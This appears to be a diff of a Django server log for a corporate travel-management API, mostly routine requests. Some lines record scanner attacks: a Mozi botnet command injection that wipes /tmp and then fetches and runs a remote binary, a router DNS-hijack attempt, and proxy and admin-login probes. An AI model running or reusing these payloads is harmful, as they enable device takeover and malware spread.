+INFO|19/May/2021 18:33:59|basehttp|841537|140224090621696|"OPTIONS /get_view_travel_request/?travel_req_id=TR100034&org_id=ORG150866 HTTP/1.1" 200 0
+INFO|19/May/2021 18:33:59|basehttp|841537|140224090621696|"OPTIONS /get_vendors_type/ HTTP/1.1" 200 0
+INFO|19/May/2021 18:33:59|basehttp|841537|140224090621696|"OPTIONS /get_travel_status_summary/?travel_req_id=TR100034&org_id=ORG150866 HTTP/1.1" 200 0
+INFO|19/May/2021 18:33:59|basehttp|841537|140223694497536|"GET /get_action_status/?module=T, HTTP/1.1" 200 2108
+INFO|19/May/2021 18:33:59|basehttp|841537|140224090621696|"OPTIONS /get_active_currency/?status_type=Active HTTP/1.1" 200 0
+INFO|19/May/2021 18:33:59|basehttp|841537|140223694497536|"GET /get_vendors_type/ HTTP/1.1" 200 7881
+INFO|19/May/2021 18:33:59|basehttp|841537|140224090621696|"GET /get_view_travel_request/?travel_req_id=TR100034&org_id=ORG150866 HTTP/1.1" 200 4102
+INFO|19/May/2021 18:33:59|basehttp|841537|140224101897984|"GET /get_active_currency/?status_type=Active HTTP/1.1" 200 5359
+INFO|19/May/2021 18:33:59|basehttp|841537|140223702890240|"GET /get_travel_status_summary/?travel_req_id=TR100034&org_id=ORG150866 HTTP/1.1" 200 972
+INFO|19/May/2021 18:34:00|basehttp|841537|140223702890240|"OPTIONS /assignment_travel_request_status/?travel_req_id=TR100034&org_id=ORG150866 HTTP/1.1" 200 0
+INFO|19/May/2021 18:34:00|basehttp|841537|140224101897984|"OPTIONS /active_taxgrid/?org=ORG150866 HTTP/1.1" 200 0
+INFO|19/May/2021 18:34:00|basehttp|841537|140224090621696|"OPTIONS /get_post_location/?country=Japan&org_id=ORG150866 HTTP/1.1" 200 0
+INFO|19/May/2021 18:34:00|basehttp|841537|140223694497536|"OPTIONS /get_create_assignment/?home=Japan&End_date=2021-06-09T05:30:00+05:30&Start_date=Sun%20Jun%2006%202021%2000:00:00%20GMT+0530%20(India%20Standard%20Time)&emp_code=tushaar001 HTTP/1.1" 200 0
+INFO|19/May/2021 18:34:00|basehttp|841537|140223694497536|"OPTIONS /get_currency_conversion/?from_currency=JPY&to_currency=USD HTTP/1.1" 200 0
+INFO|19/May/2021 18:34:00|basehttp|841537|140223694497536|"GET /assignment_travel_request_status/?travel_req_id=TR100034&org_id=ORG150866 HTTP/1.1" 200 754
+INFO|19/May/2021 18:34:00|basehttp|841537|140223694497536|"GET /active_taxgrid/?org=ORG150866 HTTP/1.1" 200 10338
+INFO|19/May/2021 18:34:00|basehttp|841537|140223694497536|"GET /get_create_assignment/?home=Japan&End_date=2021-06-09T05:30:00+05:30&Start_date=Sun%20Jun%2006%202021%2000:00:00%20GMT+0530%20(India%20Standard%20Time)&emp_code=tushaar001 HTTP/1.1" 200 63
+INFO|19/May/2021 18:34:00|basehttp|841537|140224090621696|"GET /get_post_location/?country=Japan&org_id=ORG150866 HTTP/1.1" 200 63
+INFO|19/May/2021 18:34:00|basehttp|841537|140224101897984|"GET /get_currency_conversion/?from_currency=JPY&to_currency=USD HTTP/1.1" 200 575
+INFO|19/May/2021 18:34:00|basehttp|841537|140224090621696|"OPTIONS /get_vendors_category/ HTTP/1.1" 200 0
+INFO|19/May/2021 18:34:00|basehttp|841537|140224101897984|"OPTIONS /get_add/vendor/?vendor_type=9&org_id=ORG150866 HTTP/1.1" 200 0
+INFO|19/May/2021 18:34:00|basehttp|841537|140224101897984|"POST /get_vendors_category/ HTTP/1.1" 200 3868
+INFO|19/May/2021 18:34:00|basehttp|841537|140224090621696|"GET /get_add/vendor/?vendor_type=9&org_id=ORG150866 HTTP/1.1" 200 2808
+INFO|19/May/2021 18:34:27|basehttp|841537|140224090621696|"OPTIONS /get_currency_conversion/?from_currency=INR&to_currency=USD HTTP/1.1" 200 0
+INFO|19/May/2021 18:34:28|basehttp|841537|140224090621696|"GET /get_currency_conversion/?from_currency=INR&to_currency=USD HTTP/1.1" 200 562
+INFO|19/May/2021 18:35:09|basehttp|841537|140224090621696|"GET /get_post_notification/?email=gauravg&org_id=ORG150866 HTTP/1.1" 200 63
+INFO|19/May/2021 18:35:09|basehttp|841537|140224101897984|"GET /getemployee_org_info/?employee=gauravg HTTP/1.1" 200 43
+INFO|19/May/2021 18:35:09|basehttp|841537|140223694497536|"GET /get_vendors_type/ HTTP/1.1" 200 7881
+INFO|19/May/2021 18:35:09|basehttp|841537|140224090621696|"GET /get_active_currency/?status_type=Active HTTP/1.1" 200 5359
+INFO|19/May/2021 18:35:09|basehttp|841537|140223702890240|"GET /get_action_status/?module=T, HTTP/1.1" 200 2108
+INFO|19/May/2021 18:35:09|basehttp|841537|140224101897984|"GET /get_view_travel_request/?travel_req_id=TR100034&org_id=ORG150866 HTTP/1.1" 200 4102
+INFO|19/May/2021 18:35:09|basehttp|841537|140224082228992|"GET /get_travel_status_summary/?travel_req_id=TR100034&org_id=ORG150866 HTTP/1.1" 200 972
+INFO|19/May/2021 18:35:10|basehttp|841537|140224082228992|"GET /assignment_travel_request_status/?travel_req_id=TR100034&org_id=ORG150866 HTTP/1.1" 200 754
+INFO|19/May/2021 18:35:10|basehttp|841537|140224101897984|"GET /active_taxgrid/?org=ORG150866 HTTP/1.1" 200 10338
+INFO|19/May/2021 18:35:10|basehttp|841537|140223702890240|"GET /get_post_location/?country=Japan&org_id=ORG150866 HTTP/1.1" 200 63
+INFO|19/May/2021 18:35:10|basehttp|841537|140224082228992|"GET /get_create_assignment/?home=Japan&End_date=2021-06-09T05:30:00+05:30&Start_date=Sun%20Jun%2006%202021%2000:00:00%20GMT+0530%20(India%20Standard%20Time)&emp_code=tushaar001 HTTP/1.1" 200 63
+INFO|19/May/2021 18:35:10|basehttp|841537|140224101897984|"GET /get_currency_conversion/?from_currency=JPY&to_currency=USD HTTP/1.1" 200 575
+INFO|19/May/2021 18:35:10|basehttp|841537|140224101897984|"GET /get_add/vendor/?vendor_type=9&org_id=ORG150866 HTTP/1.1" 200 2808
+INFO|19/May/2021 18:35:10|basehttp|841537|140224082228992|"POST /get_vendors_category/ HTTP/1.1" 200 3868
+INFO|19/May/2021 18:35:30|basehttp|841537|140224082228992|"OPTIONS /get_currency_conversion/?from_currency=USD&to_currency=INR HTTP/1.1" 200 0
+INFO|19/May/2021 18:35:30|basehttp|841537|140224082228992|"GET /get_currency_conversion/?from_currency=USD&to_currency=INR HTTP/1.1" 200 3597
+INFO|19/May/2021 18:35:38|basehttp|841537|140224082228992|"OPTIONS /get_currency_conversion/?from_currency=EUR&to_currency=INR HTTP/1.1" 200 0
+INFO|19/May/2021 18:35:38|basehttp|841537|140224082228992|"GET /get_currency_conversion/?from_currency=EUR&to_currency=INR HTTP/1.1" 200 1065
+INFO|19/May/2021 18:35:41|basehttp|841537|140224082228992|"GET /get_currency_conversion/?from_currency=USD&to_currency=INR HTTP/1.1" 200 3597
+INFO|19/May/2021 18:36:21|basehttp|841537|140224082228992|"OPTIONS /get_currency_conversion/?from_currency=GBP&to_currency=INR HTTP/1.1" 200 0
+INFO|19/May/2021 18:36:22|basehttp|841537|140224082228992|"GET /get_currency_conversion/?from_currency=GBP&to_currency=INR HTTP/1.1" 200 572
+INFO|19/May/2021 18:36:28|basehttp|841537|140224082228992|"GET /get_currency_conversion/?from_currency=USD&to_currency=INR HTTP/1.1" 200 3597
+WARNING|19/May/2021 18:37:34|log|841537|140224082228992|Unauthorized: /get_currency_conversion/
+WARNING|19/May/2021 18:37:34|basehttp|841537|140224082228992|"GET /get_currency_conversion/?from_currency=USD&to_currency=INR HTTP/1.1" 401 9799
+WARNING|19/May/2021 18:37:57|log|841537|140224101897984|Unauthorized: /get_currency_conversion/
+WARNING|19/May/2021 18:37:57|basehttp|841537|140224101897984|"GET /get_currency_conversion/?from_currency=USD&to_currency=INR HTTP/1.1" 401 9799
+INFO|19/May/2021 18:37:57|basehttp|841537|140224082228992|"GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 304 0
+INFO|19/May/2021 18:37:58|basehttp|841537|140224082228992|"GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 304 0
+INFO|19/May/2021 18:37:58|basehttp|841537|140224082228992|"GET /static/rest_framework/css/default.css HTTP/1.1" 304 0
+INFO|19/May/2021 18:37:58|basehttp|841537|140224101897984|"GET /static/rest_framework/css/prettify.css HTTP/1.1" 304 0
+INFO|19/May/2021 18:37:58|basehttp|841537|140224101897984|"GET /static/rest_framework/js/ajax-form.js HTTP/1.1" 304 0
+INFO|19/May/2021 18:37:58|basehttp|841537|140224101897984|"GET /static/rest_framework/js/csrf.js HTTP/1.1" 304 0
+INFO|19/May/2021 18:37:58|basehttp|841537|140224101897984|"GET /static/rest_framework/js/bootstrap.min.js HTTP/1.1" 304 0
+INFO|19/May/2021 18:37:58|basehttp|841537|140224101897984|"GET /static/rest_framework/js/prettify-min.js HTTP/1.1" 304 0
+INFO|19/May/2021 18:37:58|basehttp|841537|140224101897984|"GET /static/rest_framework/js/default.js HTTP/1.1" 304 0
+INFO|19/May/2021 18:37:58|basehttp|841537|140224082228992|"GET /static/rest_framework/js/jquery-3.3.1.min.js HTTP/1.1" 304 0
+INFO|19/May/2021 18:37:58|basehttp|841537|140224082228992|"GET /static/rest_framework/img/grid.png HTTP/1.1" 304 0
+WARNING|19/May/2021 18:38:18|log|841537|140224082228992|Unauthorized: /get_currency_conversion/
+WARNING|19/May/2021 18:38:18|basehttp|841537|140224082228992|"GET /get_currency_conversion/?from_currency=USD&to_currency=INR HTTP/1.1" 401 58
+INFO|19/May/2021 18:38:39|basehttp|841537|140224082228992|"POST /api/custom/login/ HTTP/1.1" 200 455
+INFO|19/May/2021 18:39:00|basehttp|841537|140224082228992|"GET /get_currency_conversion/?from_currency=USD&to_currency=INR HTTP/1.1" 200 3597
+INFO|19/May/2021 18:42:28|basehttp|848182|139747659978496|"GET /get_currency_conversion/?from_currency=USD&to_currency=INR HTTP/1.1" 200 3597
+WARNING|19/May/2021 19:14:36|log|848182|139747659978496|Not Found: /board.cgi
+WARNING|19/May/2021 19:14:36|basehttp|848182|139747659978496|"GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://178.175.59.114:39618/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron" 404 56900
+INFO|19/May/2021 19:30:56|basehttp|848182|139747659978496|"GET / HTTP/1.1" 200 39
+WARNING|19/May/2021 19:39:05|log|848182|139747659978496|Not Found: /manager/html
+WARNING|19/May/2021 19:39:05|basehttp|848182|139747659978496|"GET /manager/html HTTP/1.1" 404 56796
+INFO|19/May/2021 19:41:50|basehttp|848182|139747659978496|"GET / HTTP/1.1" 200 44
+WARNING|19/May/2021 20:04:22|log|848182|139747659978496|Not Found: /board.cgi
+WARNING|19/May/2021 20:04:22|basehttp|848182|139747659978496|"GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://178.175.59.181:51545/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron" 404 56900
+INFO|19/May/2021 21:10:53|basehttp|848182|139747659978496|"GET / HTTP/1.0" 200 59
+ERROR|19/May/2021 22:33:16|exception|848182|139747659978496|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+WARNING|19/May/2021 22:33:16|log|848182|139747659978496|Bad Request: /manager/html
+WARNING|19/May/2021 22:33:16|basehttp|848182|139747659978496|"GET /manager/html HTTP/1.1" 400 65014
+WARNING|20/May/2021 01:27:02|log|848182|139747659978496|Not Found: /dnscfg.cgi
+WARNING|20/May/2021 01:27:02|basehttp|848182|139747659978496|"GET /dnscfg.cgi?dnsPrimary=192.95.59.130&dnsSecondary8.8.4.4&dnsDynamic=0&dnsRefresh=1 HTTP/1.1" 404 56873
+INFO|20/May/2021 01:27:02|basehttp|848182|139747659978496|"GET / HTTP/1.1" 200 9575
+WARNING|20/May/2021 01:33:25|log|848182|139747659978496|Not Found: /http:/check.best-proxies.ru/azenv.php
+WARNING|20/May/2021 01:33:25|basehttp|848182|139747659978496|"POST http://check.best-proxies.ru/azenv.php?s=VJVJVBYEINOONJTCPEIIYIYEOEIOYR HTTP/1.1" 404 1762
+WARNING|20/May/2021 01:33:30|log|848182|139747659978496|Not Found: /5.178.86.76:80
+WARNING|20/May/2021 01:33:30|basehttp|848182|139747659978496|"CONNECT 5.178.86.76:80 HTTP/1.1" 404 1664
+INFO|20/May/2021 01:33:40|basehttp|848182|139747659978496|code 400, message Bad request syntax ('\x04\x01\x00P\x05²VL0\x00')
+WARNING|20/May/2021 01:33:40|basehttp|848182|139747659978496|" P²VL0 " 400 -
+INFO|20/May/2021 01:33:40|basehttp|848182|139747659978496|- Broken pipe from ('109.234.153.132', 33627)
+
+INFO|20/May/2021 01:33:45|basehttp|848182|139747659978496|code 400, message Bad request syntax ('\x05\x01\x00')
+WARNING|20/May/2021 01:33:45|basehttp|848182|139747659978496|" " 400 -
+INFO|20/May/2021 01:33:45|basehttp|848182|139747659978496|- Broken pipe from ('109.234.153.132', 51687)
+
+INFO|20/May/2021 01:36:44|basehttp|848182|139747659978496|"OPTIONS / HTTP/1.0" 200 212
+WARNING|20/May/2021 01:40:45|log|848182|139747659978496|Not Found: /http:/check.best-proxies.ru/azenv.php
+WARNING|20/May/2021 01:40:45|basehttp|848182|139747659978496|"POST http://check.best-proxies.ru/azenv.php?s=VJVJVBYEINOONJTCPONXYEVBOEIOYR HTTP/1.1" 404 1762
+WARNING|20/May/2021 01:40:50|log|848182|139747659978496|Not Found: /5.178.86.76:80
+WARNING|20/May/2021 01:40:50|basehttp|848182|139747659978496|"CONNECT 5.178.86.76:80 HTTP/1.1" 404 1664
+INFO|20/May/2021 01:41:00|basehttp|848182|139747659978496|code 400, message Bad request syntax ('\x04\x01\x00P\x05²VL0\x00')
+WARNING|20/May/2021 01:41:00|basehttp|848182|139747659978496|" P²VL0 " 400 -
+INFO|20/May/2021 01:41:00|basehttp|848182|139747659978496|- Broken pipe from ('109.234.153.133', 43543)
+
+INFO|20/May/2021 01:41:05|basehttp|848182|139747659978496|code 400, message Bad request syntax ('\x05\x01\x00')
+WARNING|20/May/2021 01:41:05|basehttp|848182|139747659978496|" " 400 -
+INFO|20/May/2021 01:41:05|basehttp|848182|139747659978496|- Broken pipe from ('109.234.153.133', 54571)
+
+INFO|20/May/2021 02:01:58|basehttp|848182|139747659978496|"GET / HTTP/1.1" 200 44
+INFO|20/May/2021 02:14:44|basehttp|848182|139747659978496|"GET / HTTP/1.1" 200 44
+ERROR|20/May/2021 02:41:47|exception|848182|139747659978496|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+WARNING|20/May/2021 02:41:47|log|848182|139747659978496|Bad Request: /manager/html
+WARNING|20/May/2021 02:41:48|basehttp|848182|139747659978496|"GET /manager/html HTTP/1.1" 400 65014
+INFO|20/May/2021 03:21:09|basehttp|848182|139747659978496|"GET / HTTP/1.0" 200 9575
+WARNING|20/May/2021 03:44:31|log|848182|139747659978496|Not Found: /config/getuser
+WARNING|20/May/2021 03:44:32|basehttp|848182|139747659978496|"GET /config/getuser?index=0 HTTP/1.1" 404 56810
+ERROR|20/May/2021 03:44:32|basehttp|848182|139747659978496|"GET /config/getuser?index=0 HTTP/1.1" 500 59
+INFO|20/May/2021 04:31:57|basehttp|848182|139747659978496|"GET / HTTP/1.1" 200 44
+INFO|20/May/2021 04:43:13|basehttp|848182|139747659978496|"GET / HTTP/1.1" 200 44
+INFO|20/May/2021 06:01:11|basehttp|848182|139747659978496|"GET / HTTP/1.1" 200 44
+INFO|20/May/2021 06:01:12|basehttp|848182|139747659978496|"GET / HTTP/1.1" 200 44
+ERROR|20/May/2021 06:30:16|exception|848182|139747659978496|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+WARNING|20/May/2021 06:30:16|log|848182|139747659978496|Bad Request: /manager/html
+WARNING|20/May/2021 06:30:16|basehttp|848182|139747659978496|"GET /manager/html HTTP/1.1" 400 65014
+WARNING|20/May/2021 07:25:24|log|848182|139747659978496|Not Found: /http:/check.best-proxies.ru/azenv.php
+WARNING|20/May/2021 07:25:24|basehttp|848182|139747659978496|"POST http://check.best-proxies.ru/azenv.php?s=VJVJVBYEINOONJTCPNKDOOKBKEIOYR HTTP/1.1" 404 1762
+WARNING|20/May/2021 07:25:29|log|848182|139747659978496|Not Found: /5.178.86.76:80
+WARNING|20/May/2021 07:25:29|basehttp|848182|139747659978496|"CONNECT 5.178.86.76:80 HTTP/1.1" 404 1664
+INFO|20/May/2021 07:25:39|basehttp|848182|139747659978496|code 400, message Bad request syntax ('\x04\x01\x00P\x05²VL0\x00')
+WARNING|20/May/2021 07:25:39|basehttp|848182|139747659978496|" P²VL0 " 400 -
+INFO|20/May/2021 07:25:39|basehttp|848182|139747659978496|- Broken pipe from ('109.234.153.133', 29129)
+
+INFO|20/May/2021 07:25:44|basehttp|848182|139747659978496|code 400, message Bad request syntax ('\x05\x01\x00')
+WARNING|20/May/2021 07:25:44|basehttp|848182|139747659978496|" " 400 -
+WARNING|20/May/2021 07:25:46|log|848182|139747659978496|Not Found: /http:/check.best-proxies.ru/azenv.php
+WARNING|20/May/2021 07:25:46|basehttp|848182|139747659978496|"POST http://check.best-proxies.ru/azenv.php?s=VJVJVBYEINOONJTCPXKEKEKBKEIOYR HTTP/1.1" 404 1762
+WARNING|20/May/2021 07:25:51|log|848182|139747659978496|Not Found: /5.178.86.76:80
+WARNING|20/May/2021 07:25:51|basehttp|848182|139747659978496|"CONNECT 5.178.86.76:80 HTTP/1.1" 404 1664
+INFO|20/May/2021 07:26:01|basehttp|848182|139747659978496|code 400, message Bad request syntax ('\x04\x01\x00P\x05²VL0\x00')
+WARNING|20/May/2021 07:26:01|basehttp|848182|139747659978496|" P²VL0 " 400 -
+INFO|20/May/2021 07:26:01|basehttp|848182|139747659978496|- Broken pipe from ('109.234.153.130', 50141)
+
+INFO|20/May/2021 07:26:06|basehttp|848182|139747659978496|code 400, message Bad request syntax ('\x05\x01\x00')
+WARNING|20/May/2021 07:26:06|basehttp|848182|139747659978496|" " 400 -
+INFO|20/May/2021 07:26:06|basehttp|848182|139747659978496|- Broken pipe from ('109.234.153.134', 22495)
+
+WARNING|20/May/2021 07:51:06|log|848182|139747659978496|Not Found: /boaform/admin/formLogin
+WARNING|20/May/2021 07:51:06|basehttp|848182|139747659978496|"GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0" 404 56871
+WARNING|20/May/2021 09:59:26|log|848182|139747659978496|Not Found: /http:/check.best-proxies.ru/azenv.php
+WARNING|20/May/2021 09:59:26|basehttp|848182|139747659978496|"POST http://check.best-proxies.ru/azenv.php?s=VJVJVBYEINOONJTCPUIBKUNEUEIOYR HTTP/1.1" 404 1762
+WARNING|20/May/2021 09:59:31|log|848182|139747659978496|Not Found: /5.178.86.76:80
+WARNING|20/May/2021 09:59:31|basehttp|848182|139747659978496|"CONNECT 5.178.86.76:80 HTTP/1.1" 404 1664
+INFO|20/May/2021 09:59:41|basehttp|848182|139747659978496|code 400, message Bad request syntax ('\x04\x01\x00P\x05²VL0\x00')
+WARNING|20/May/2021 09:59:41|basehttp|848182|139747659978496|" P²VL0 " 400 -
+INFO|20/May/2021 09:59:41|basehttp|848182|139747659978496|- Broken pipe from ('109.234.153.134', 61349)
+
+INFO|20/May/2021 09:59:46|basehttp|848182|139747659978496|code 400, message Bad request syntax ('\x05\x01\x00')
+WARNING|20/May/2021 09:59:46|basehttp|848182|139747659978496|" " 400 -
+INFO|20/May/2021 09:59:46|basehttp|848182|139747659978496|- Broken pipe from ('109.234.153.132', 7761)
+
+INFO|20/May/2021 10:01:47|basehttp|848182|139747659978496|"GET / HTTP/1.1" 200 44
+WARNING|20/May/2021 10:05:45|log|848182|139747659978496|Not Found: /http:/check.best-proxies.ru/azenv.php
+WARNING|20/May/2021 10:05:45|basehttp|848182|139747659978496|"POST http://check.best-proxies.ru/azenv.php?s=VJVJVBYEINOONJTCPJKOYEPBUEIOYR HTTP/1.1" 404 1762
+WARNING|20/May/2021 10:05:50|log|848182|139747659978496|Not Found: /5.178.86.76:80
+WARNING|20/May/2021 10:05:50|basehttp|848182|139747659978496|"CONNECT 5.178.86.76:80 HTTP/1.1" 404 1664
+INFO|20/May/2021 10:06:00|basehttp|848182|139747659978496|code 400, message Bad request syntax ('\x04\x01\x00P\x05²VL0\x00')
+WARNING|20/May/2021 10:06:00|basehttp|848182|139747659978496|" P²VL0 " 400 -
+INFO|20/May/2021 10:06:00|basehttp|848182|139747659978496|- Broken pipe from ('109.234.153.131', 10201)
+
+INFO|20/May/2021 10:06:05|basehttp|848182|139747659978496|code 400, message Bad request syntax ('\x05\x01\x00')
+WARNING|20/May/2021 10:06:05|basehttp|848182|139747659978496|" " 400 -
+INFO|20/May/2021 10:06:05|basehttp|848182|139747659978496|- Broken pipe from ('109.234.153.130', 12959)
+
+ERROR|20/May/2021 10:19:56|exception|848182|139747659978496|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+WARNING|20/May/2021 10:19:56|log|848182|139747659978496|Bad Request: /manager/html
+WARNING|20/May/2021 10:19:57|basehttp|848182|139747659978496|"GET /manager/html HTTP/1.1" 400 65014
+INFO|20/May/2021 10:37:44|basehttp|848182|139747659978496|"OPTIONS /api/custom/login/ HTTP/1.1" 200 0
+INFO|20/May/2021 10:37:44|basehttp|848182|139747659978496|"POST /api/custom/login/ HTTP/1.1" 200 455
+INFO|20/May/2021 10:37:45|basehttp|848182|139747659978496|"OPTIONS /emoloyeeinfo/ HTTP/1.1" 200 0
+INFO|20/May/2021 10:37:45|basehttp|848182|139747659978496|"POST /emoloyeeinfo/ HTTP/1.1" 200 1571
+INFO|20/May/2021 10:37:45|basehttp|848182|139747648177920|"OPTIONS /getemployee_org_info/?employee=div944 HTTP/1.1" 200 0
+INFO|20/May/2021 10:37:45|basehttp|848182|139747659978496|"OPTIONS /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 200 0
+INFO|20/May/2021 10:37:45|basehttp|848182|139747659978496|"GET /getemployee_org_info/?employee=div944 HTTP/1.1" 200 43
+INFO|20/May/2021 10:37:45|basehttp|848182|139747648177920|"GET /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 200 63
+INFO|20/May/2021 10:37:45|basehttp|848182|139747648177920|"OPTIONS /org_travel_request/?travel_req_status=2&org_id=ORG150866&current_ticket_email=div944 HTTP/1.1" 200 0
+INFO|20/May/2021 10:37:45|basehttp|848182|139747659978496|"OPTIONS /get_travel_request_approver_top/?emp_email=div944&travel_req_status=2&type=Travel&org_id=ORG150866&limit=5 HTTP/1.1" 200 0
+INFO|20/May/2021 10:37:45|basehttp|848182|139747648177920|"OPTIONS /get_add/travel_request/?travel_req_status=2&org_id=ORG150866&emp_email=div944 HTTP/1.1" 200 0
+INFO|20/May/2021 10:37:45|basehttp|848182|139747648177920|"OPTIONS /getemployee_passport_info/?employee=div944 HTTP/1.1" 200 0
+INFO|20/May/2021 10:37:45|basehttp|848182|139747648177920|"OPTIONS /post_get_calender_event/?emp_code=div944 HTTP/1.1" 200 0
+INFO|20/May/2021 10:37:45|basehttp|848182|139747659978496|"OPTIONS /get_travel_count_user/?emp_code=div944 HTTP/1.1" 200 0
+INFO|20/May/2021 10:37:45|basehttp|848182|139747648177920|"OPTIONS /getemployee_visa_info/?employee=div944 HTTP/1.1" 200 0
+INFO|20/May/2021 10:37:45|basehttp|848182|139747659978496|"GET /get_travel_request_approver_top/?emp_email=div944&travel_req_status=2&type=Travel&org_id=ORG150866&limit=5 HTTP/1.1" 200 48
+INFO|20/May/2021 10:37:45|basehttp|848182|139747557107456|"GET /getemployee_visa_info/?employee=div944 HTTP/1.1" 200 43
+INFO|20/May/2021 10:37:45|basehttp|848182|139747659978496|"GET /getemployee_passport_info/?employee=div944 HTTP/1.1" 200 805
+INFO|20/May/2021 10:37:45|basehttp|848182|139747548714752|"GET /post_get_calender_event/?emp_code=div944 HTTP/1.1" 200 48
+INFO|20/May/2021 10:37:46|basehttp|848182|139747540322048|"GET /get_travel_count_user/?emp_code=div944 HTTP/1.1" 200 84
+INFO|20/May/2021 10:37:46|basehttp|848182|139747648177920|"GET /org_travel_request/?travel_req_status=2&org_id=ORG150866&current_ticket_email=div944 HTTP/1.1" 200 20141
+INFO|20/May/2021 10:37:46|basehttp|848182|139747565500160|"GET /get_add/travel_request/?travel_req_status=2&org_id=ORG150866&emp_email=div944 HTTP/1.1" 200 43838
+INFO|20/May/2021 10:37:48|basehttp|848182|139747648177920|"OPTIONS /get_org_count_travel_requests/?org_id=ORG150866 HTTP/1.1" 200 0
+INFO|20/May/2021 10:37:49|basehttp|848182|139747648177920|"GET /get_org_count_travel_requests/?org_id=ORG150866 HTTP/1.1" 200 78
+INFO|20/May/2021 10:37:49|basehttp|848182|139747565500160|"OPTIONS /get_org_count_visa_requests/?org_id=ORG150866 HTTP/1.1" 200 0
+INFO|20/May/2021 10:37:49|basehttp|848182|139747565500160|"GET /get_org_count_visa_requests/?org_id=ORG150866 HTTP/1.1" 200 77
+INFO|20/May/2021 10:51:24|basehttp|848182|139747565500160|"OPTIONS /get_country_master/?country= HTTP/1.1" 200 0
+INFO|20/May/2021 10:51:24|basehttp|848182|139747565500160|"OPTIONS /get_post_per_diem/?organization=ORG150866 HTTP/1.1" 200 0
+INFO|20/May/2021 10:51:24|basehttp|848182|139747565500160|"OPTIONS /get_add/currency/ HTTP/1.1" 200 0
+INFO|20/May/2021 10:51:25|basehttp|848182|139747565500160|"GET /get_country_master/?country= HTTP/1.1" 200 58715
+INFO|20/May/2021 10:51:25|basehttp|848182|139747648177920|"GET /get_add/currency/ HTTP/1.1" 200 125173
+INFO|20/May/2021 10:51:25|basehttp|848182|139747540322048|"GET /get_post_per_diem/?organization=ORG150866 HTTP/1.1" 200 33825
+INFO|20/May/2021 10:51:40|basehttp|848182|139747540322048|"OPTIONS /get_post_per_diem/ HTTP/1.1" 200 0
+INFO|20/May/2021 10:51:40|basehttp|848182|139747540322048|"POST /get_post_per_diem/ HTTP/1.1" 201 657
+INFO|20/May/2021 10:51:40|basehttp|848182|139747540322048|"GET /get_post_per_diem/?organization=ORG150866 HTTP/1.1" 200 33857
+INFO|20/May/2021 10:52:17|basehttp|848182|139747648177920|"GET /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 200 63
+INFO|20/May/2021 10:52:17|basehttp|848182|139747540322048|"GET /getemployee_org_info/?employee=div944 HTTP/1.1" 200 43
+INFO|20/May/2021 10:52:17|basehttp|848182|139747648177920|"GET /get_country_master/?country= HTTP/1.1" 200 58715
+INFO|20/May/2021 10:52:17|basehttp|848182|139747540322048|"GET /get_post_per_diem/?organization=ORG150866 HTTP/1.1" 200 33857
+INFO|20/May/2021 10:52:18|basehttp|848182|139747565500160|"GET /get_add/currency/ HTTP/1.1" 200 125173
+INFO|20/May/2021 10:55:35|basehttp|848182|139747565500160|"GET /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 200 63
+INFO|20/May/2021 10:55:35|basehttp|848182|139747540322048|"GET /getemployee_org_info/?employee=div944 HTTP/1.1" 200 43
+INFO|20/May/2021 10:55:35|basehttp|848182|139747648177920|"GET /get_country_master/?country= HTTP/1.1" 200 58715
+INFO|20/May/2021 10:55:35|basehttp|848182|139747565500160|"GET /get_add/currency/ HTTP/1.1" 200 125173
+INFO|20/May/2021 10:55:35|basehttp|848182|139747540322048|"GET /get_post_per_diem/?organization=ORG150866 HTTP/1.1" 200 33857
+INFO|20/May/2021 10:58:48|basehttp|848182|139747540322048|"GET /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 200 63
+INFO|20/May/2021 10:58:48|basehttp|848182|139747540322048|"GET /getemployee_org_info/?employee=div944 HTTP/1.1" 200 43
+INFO|20/May/2021 10:58:48|basehttp|848182|139747565500160|"GET /get_post_per_diem/?organization=ORG150866 HTTP/1.1" 200 33857
+INFO|20/May/2021 10:58:48|basehttp|848182|139747648177920|"GET /get_country_master/?country= HTTP/1.1" 200 58715
+INFO|20/May/2021 10:58:49|basehttp|848182|139747540322048|"GET /get_add/currency/ HTTP/1.1" 200 125173
+INFO|20/May/2021 11:01:51|basehttp|848182|139747540322048|"GET /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 200 63
+INFO|20/May/2021 11:01:51|basehttp|848182|139747540322048|"GET /getemployee_org_info/?employee=div944 HTTP/1.1" 200 43
+INFO|20/May/2021 11:01:51|basehttp|848182|139747565500160|"GET /get_country_master/?country= HTTP/1.1" 200 58715
+INFO|20/May/2021 11:01:51|basehttp|848182|139747648177920|"GET /get_post_per_diem/?organization=ORG150866 HTTP/1.1" 200 33857
+INFO|20/May/2021 11:01:51|basehttp|848182|139747540322048|"GET /get_add/currency/ HTTP/1.1" 200 125173
+ERROR|20/May/2021 11:03:01|log|848182|139747540322048|Internal Server Error: /get_post_per_diem/
 Traceback (most recent call last):
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 34, in inner
     response = get_response(request)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
-    response = wrapped_callback(request, *callback_args, **callback_kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
-    response = wrapped_callback(request, *callback_args, **callback_kwargs)
